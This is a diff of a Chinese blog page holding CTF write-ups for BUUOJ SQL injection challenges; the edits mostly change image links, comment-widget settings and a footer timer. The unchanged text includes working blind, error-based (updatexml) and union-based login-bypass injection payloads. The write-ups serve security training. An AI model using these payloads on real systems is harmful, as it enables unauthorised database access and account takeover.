@@ -241,7 +241,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：1 个月前
+                  本文最后更新于：5 天前
                 
               </p>
             
@@ -251,11 +251,11 @@
 <h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>给了提示，<code>All You Want Is In Table &#39;flag&#39; and the column is &#39;flag&#39;</code></p>
 <p>猜测flag在flag 表中，查询语句应该是 select flag from flag</p>
 <p>经过测试，发现这题过滤了很多关键字，or,union,order等，猜测是盲注</p>
-<p><img src="/2020/10/05/buuoj/fuzz.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/gJAqhVCpN8nYvs1.png" srcset="/img/loading.gif" alt></p>
 <p>构造盲注语句</p>
 <p><code>id=if((ascii(substr((select(flag)from(flag)),0,1))&gt;90),1,2)</code></p>
-<p><img src="/2020/10/05/buuoj/1.png" srcset="/img/loading.gif" alt></p>
-<p><img src="/2020/10/05/buuoj/2.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/YGtuAcFr2sHZUdD.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/oUqeZdHLfJCQPgr.png" srcset="/img/loading.gif" alt></p>
 <p>两次的提示语句不一样，说明这个注入语句是对的，且当提示Hello时应该是对的。</p>
 <div class="hljs"><pre><code class="hljs python">// 二分注入
 <span class="hljs-keyword">import</span> requests
@@ -289,7 +289,7 @@ print(flag)</code></pre></div>
 
 <h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p><strong>报错注入</strong></p>
 <p>测试发现<code>or,union,substr,空格,/**/</code>等都被加入黑名单，双写也无法绕过</p>
-<p><img src="/2020/10/05/buuoj/%E8%BF%87%E6%BB%A4.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/uHTdrgxB7I8QLDK.png" srcset="/img/loading.gif" alt></p>
 <p>可是使用报错注入</p>
 <blockquote>
 <p>报错注入原理：</p>
@@ -310,7 +310,6 @@ print(flag)</code></pre></div>
 ?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span>(H4rDsq1)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span></code></pre></div>
 
 <p>这里会发现flag显示不全，可能是报错现实的字数限制，利用right/left函数，显示部分的flag，之后拼接起来</p>
-<p><img src="/2020/10/05/buuoj/flag1.png" srcset="/img/loading.gif" alt></p>
 <p>显示后面的flag</p>
 <div class="hljs"><pre><code class="hljs angelscript">?username=admin&amp;password=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select(right(password,<span class="hljs-number">30</span>))<span class="hljs-keyword">from</span>(geek.H4rDsq1)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span></code></pre></div>
 
@@ -353,7 +352,7 @@ $result = mysqli_query($con, $sql);
 &#125;</code></pre></div>
 
 <p>随便输入用户名和密码，查看源码，出现提示</p>
-<p><img src="/2020/10/05/buuoj/sqli1.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/yMceIJS4DYLHsh6.png" srcset="/img/loading.gif" alt></p>
 <p>试了试应该是base32，解码后是base64</p>
 <div class="hljs"><pre><code class="hljs gcode">c<span class="hljs-number">2</span><span class="hljs-attr">VsZWN0</span>ICogZ<span class="hljs-symbol">nJvbSB1</span>c<span class="hljs-number">2</span>VyIHdoZXJlIHVzZXJuYW<span class="hljs-number">1</span>lID<span class="hljs-number">0</span>gJyRuYW<span class="hljs-number">1</span>lJw==</code></pre></div>
 
@@ -368,11 +367,11 @@ $result = mysqli_query($con, $sql);
 <p>输入username=admn&amp;password=11,时提示wrong user!，所以可以判断用户名为admin</p>
 <p>接下来介绍一种新的union注入</p>
 <p>先建立一张表</p>
-<p><img src="/2020/10/05/buuoj/sqli3.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/9bS4DTXuCfmxykg.png" srcset="/img/loading.gif" alt></p>
 <div class="hljs"><pre><code class="hljs crystal"><span class="hljs-keyword">select</span> * from test where id=<span class="hljs-number">0</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,'<span class="hljs-title">admin</span>','2322';</span></code></pre></div>
 
 <p>union语句后查询的是表中不存在的一个数据，查询结果如下</p>
-<p><img src="/2020/10/05/buuoj/sqli2.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/n6EeYVXdCxH72oO.png" srcset="/img/loading.gif" alt></p>
 <p><strong>这个结果说明，union查询一个不存在的数据时，会建立一个虚拟表</strong>，其中放着所查询到的数据和union后包含的数据</p>
 <p>这里就是 id=1,username=admin,password=2322</p>
 <p>这样就可以利用这个改变数据库中用户的密码，然后用自己设置的密码登录</p>
@@ -384,7 +383,7 @@ $result = mysqli_query($con, $sql);
 <div class="hljs"><pre><code class="hljs routeros"><span class="hljs-attribute">name</span>=000'union select 1,<span class="hljs-string">'admin'</span>,<span class="hljs-string">'b59c67bf196a4758191e42f76670ceba'</span>#&amp;<span class="hljs-attribute">pw</span>=1111</code></pre></div>
 
 <p><code>b59c67bf196a4758191e42f76670ceba</code>是1111的md5值，pw的值为1111</p>
-<p><img src="/2020/10/05/buuoj/sqli.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/Xhp1PgH7QlejDYn.png" srcset="/img/loading.gif" alt></p>
 
             </div>
             <hr>
@@ -448,7 +447,7 @@ $result = mysqli_query($con, $sql);
   <div id="vcomments"></div>
   <script type="text/javascript">
     function loadValine() {
-      addScript('https://cdn.staticfile.org/valine/1.4.14/Valine.min.js', function () {
+      addScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js', function () {
         new Valine({
           el: "#vcomments",
           app_id: "2rPljbm5WOxA9BCPXqy3VE5y-gzGzoHsz",
@@ -462,6 +461,9 @@ $result = mysqli_query($con, $sql);
           highlight: true,
           recordIP: false,
           serverURLs: "",
+          master: "4cd096660a71d786a2a4d9d0bb4e8996",
+          friends: "b275f0fc8103331da645a878cf60f841",
+          tagMeta: ["博主","友人","访客"],
         });
       });
     }
@@ -715,7 +717,43 @@ $result = mysqli_query($con, $sql);
 
 
 
-
+<div class="text-center py-1">   
+  <div>
+    <span>Copyright © 2020</span></a>
+    <a href="http://sunzy.icu/" target="_blank" rel="nofollow noopener">
+     <span>my blog</span></a>    <br>
+  </div>
+<div>
+  <span id="timeDate">载入天数...</span>
+  <span id="times">载入时分秒...</span>
+  <script>
+  var now = new Date();
+  function createtime(){
+      var grt= new Date("03/02/2020 00:00:00");//此处修改你的建站时间或者网站上线时间
+      now.setTime(now.getTime()+250);
+      days = (now - grt ) / 1000 / 60 / 60 / 24;
+      dnum = Math.floor(days);
+      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+      hnum = Math.floor(hours);
+      if(String(hnum).length ==1 ){
+          hnum = "0" + hnum;
+      }
+      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+      mnum = Math.floor(minutes);
+      if(String(mnum).length ==1 ){
+                mnum = "0" + mnum;
+      }
+      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+      snum = Math.round(seconds);
+      if(String(snum).length ==1 ){
+                snum = "0" + snum;
+      }
+      document.getElementById("timeDate").innerHTML = "🚀 for&nbsp"+dnum+"&nbspdays";  //此次自定义显示内容
+      document.getElementById("times").innerHTML = hnum + "&nbsphr&nbsp" + mnum + "&nbspmin&nbsp" + snum + "&nbspsec";
+  }  //此次自定义显示内容
+  setInterval("createtime()",250);
+  </script>
+</div>
 
 <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
 </html>
